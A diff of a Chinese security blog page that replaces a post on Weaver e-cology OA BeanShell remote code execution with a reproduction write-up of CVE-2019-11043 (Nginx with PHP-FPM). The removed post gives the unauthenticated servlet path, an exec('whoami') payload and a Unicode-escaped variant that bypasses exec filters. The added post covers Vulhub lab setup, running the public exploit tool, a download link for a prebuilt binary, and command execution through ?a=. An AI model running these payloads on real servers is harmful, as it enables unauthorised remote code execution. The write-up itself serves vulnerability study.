@@ -48,9 +48,10 @@
 <ul>
 <li>
 <ul>
-<li><a href="#0x01-%E8%AE%BF%E9%97%AE%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%A1%B5%E9%9D%A2">0x01 访问未授权访问页面</a></li>
-<li><a href="#0x02-%E8%BE%93%E5%85%A5payload">0x02 输入payload</a></li>
-<li><a href="#0x03-%E5%B0%86exec%E8%BF%9B%E8%A1%8Cunicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E9%83%A8%E5%88%86%E7%AB%99%E7%82%B9exec%E8%BF%87%E6%BB%A4">0x03 将exec进行Unicode编码绕过部分站点exec过滤</a></li>
+<li><a href="#0x01-%E8%83%8C%E6%99%AF">0x01 背景</a></li>
+<li><a href="#0x02-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4">0x02 影响范围</a></li>
+<li><a href="#0x04-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x04 漏洞利用</a></li>
+<li><a href="#0x05-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0">0x05 漏洞成因</a></li>
 </ul>
 </li>
 </ul>
@@ -101,26 +102,87 @@
 <div class="mask" onclick="closeMenu()">
 </div>
       <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
-        <h1 class="text-3xl font-bold lg:mt-16">泛微e-cology OA Beanshell组件远程代码执行(复现及POC)</h1>
+        <h1 class="text-3xl font-bold lg:mt-16">Nginx的PHP-FPM远程代码执行漏洞复现</h1>
         <div class="text-sm text-gray-700 lg:my-8">
-          2019-09-23 / 1 min read
+          2019-10-24 / 3 min read
         </div>
         
-          <img class="post-feature-image rounded-lg mx-auto my-4" src="http://www.svenbeast.com//post-images/9rcdl83tA.png" alt="">
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="http://www.svenbeast.com//post-images/dyp738nRt.png" alt="">
         
         <div class="post-content yue">
-          <h3 id="0x01-访问未授权访问页面">0x01 访问未授权访问页面</h3>
-<p>http://oa.xxxx.com/weaver/bsh.servlet.BshServlet<br>
-<img src="http://www.svenbeast.com//post-images/1569211550430.jpg" alt=""></p>
-<h3 id="0x02-输入payload">0x02 输入payload</h3>
-<p>exec(&quot;whoami&quot;);<br>
-输入命令执行函数，传入cmd命令，查看回显是否成功执行<br>
-<img src="http://www.svenbeast.com//post-images/1569211623826.png" alt=""></p>
-<h3 id="0x03-将exec进行unicode编码绕过部分站点exec过滤">0x03 将exec进行Unicode编码绕过部分站点exec过滤</h3>
-<p>\u0065\u0078\u0065\u0063(&quot;whoami&quot;);<br>
-<img src="http://www.svenbeast.com//post-images/1569211999619.png" alt=""></p>
-<p>PS：https://github.com/jas502n/e-cology<br>
-少宇师傅的POC地址，后期批量有时间就写，现在70周年国庆节，有点忙。</p>
+          <h3 id="0x01-背景">0x01 背景</h3>
+<pre><code>在9 月 14 日至 18 举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，
+向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。
+
+Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。
+而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。
+攻击者通过精心的构造和利用，可以导致远程代码执行。
+
+漏洞编号：CVE-2019-11043
+漏洞 PoC 在 10 月 22 日公开。
+</code></pre>
+<h3 id="0x02-影响范围">0x02 影响范围</h3>
+<ul>
+<li>Nginx + php-fpm的服务器（php&gt;5.6），在使用如下配置的情况下，都可能存在远程代码执行漏洞。</li>
+</ul>
+<pre><code> location ~ [^/]\.php(/|$) {
+
+        fastcgi_split_path_info ^(.+?\.php)(/.*)$;
+
+        fastcgi_param PATH_INFO       $fastcgi_path_info;
+
+        fastcgi_pass   php:9000;
+
+        ...
+  }
+}
+</code></pre>
+<p>0x03 环境搭建</p>
+<p>靶机：ubuntu， Vulhub，docker</p>
+<pre><code>命令集合
+mkdir CVE-2019-11043
+cd CVE-2019-11043/
+wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/default.conf
+wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/docker-compose.yml
+mkdir www
+cd www/
+wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/www/index.php
+cd ../
+service docker start
+sudo docker-compose up -d
+访问 http://靶机ip:8080/index.php
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1571910239956.png" alt=""></figure>
+<h3 id="0x04-漏洞利用">0x04 漏洞利用</h3>
+<pre><code>poc是使用go语言编写的，这里已经编译好exe，提供下载
+链接: https://pan.baidu.com/s/1bbV15sw-Yx-PX3LFIE2ggA 提取码: sven
+</code></pre>
+<ul>
+<li>usage：phuip-fpizdam.exe http://192.168.43.21:8080/index.php<br>
+<img src="http://www.svenbeast.com//post-images/1571911181021.png" alt=""></li>
+</ul>
+<pre><code>有go语言环境的可以直接运行
+git clone https://github.com/neex/phuip-fpizdam.git
+cd phuip-fpizdam
+go run . &quot;http://your-ip:8080/index.php&quot;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1571910958896.png" alt=""></figure>
+<ul>
+<li>
+<p>poc运行完毕后可以直接远程代码执行，?a=whoami<br>
+usage:输入命令后，需要多执行几次刷新，以访问到被污染的进程。<br>
+<img src="http://www.svenbeast.com//post-images/1571911526452.png" alt=""></p>
+</li>
+<li>
+<p>index.php源码<br>
+<img src="http://www.svenbeast.com//post-images/1571911584720.png" alt=""></p>
+</li>
+</ul>
+<h3 id="0x05-漏洞成因">0x05 漏洞成因</h3>
+<pre><code>因为“fpm_main.c”文件的第1150行代码中由于\n(%0a)的传入导致nginx传递给php-fpm的PATH_INFO为空。
+https://github.com/php/php-src/blob/master/sapi/fpm/fpm/fpm_main.c#L1150
+进而导致可以通过FCGI_PUTENV与PHP_VALUE相结合，修改当前的php-fpm进程中的php配置。在特殊构造的配置生效的情况下可以触发任意代码执行。
+</code></pre>
 
         </div>
 
@@ -129,21 +191,12 @@
 
         <div class="flex justify-between py-8">
           
-            <div class="prev-post">
-              <a href="http://www.svenbeast.com//post/2OBQlt_Ta">
-                <h3 class="post-title">
-                  <i class="remixicon-arrow-left-line"></i>
-                  phpstudy后门利用方法及getshell
-                </h3>
-              </a>
-            </div>
-          
 
           
             <div class="next-post">
-              <a href="http://www.svenbeast.com//post/fkOpKjach">
+              <a href="http://www.svenbeast.com//post/c0VE5mjC-">
                 <h3 class="post-title">
-                  Shiro&lt;=1.2.4反序列化的简单理解及POC
+                  fastjson&lt;=1.2.47反序列化漏洞复现
                   <i class="remixicon-arrow-right-line"></i>
                 </h3>
               </a>
